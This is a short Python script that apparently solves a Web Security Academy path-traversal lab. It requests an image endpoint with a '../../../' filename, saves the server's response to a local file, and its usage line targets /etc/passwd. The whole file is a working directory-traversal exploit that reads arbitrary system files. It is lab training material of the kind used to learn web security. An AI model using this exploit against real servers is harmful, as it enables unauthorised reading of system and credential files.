# usage:
# python3 1.py \
# --u https://0aaa00a7037819be80f76c960063008a.web-security-academy.net \
# --f /etc/passwd

from argparse import ArgumentParser

import requests


def solve(url: str, filename: str) -> None:
    r = requests.get(f"{url.rstrip('/')}/image?filename=../../../{filename}")

    with open("1.download", "wb") as f:
        f.write(r.content)


def main():
    parser = ArgumentParser()
    parser.add_argument("--u", "--url", dest="url")
    parser.add_argument("--f", "--filename", dest="filename")
    args = parser.parse_args()
    solve(args.url, args.filename)


if __name__ == "__main__":
    main()
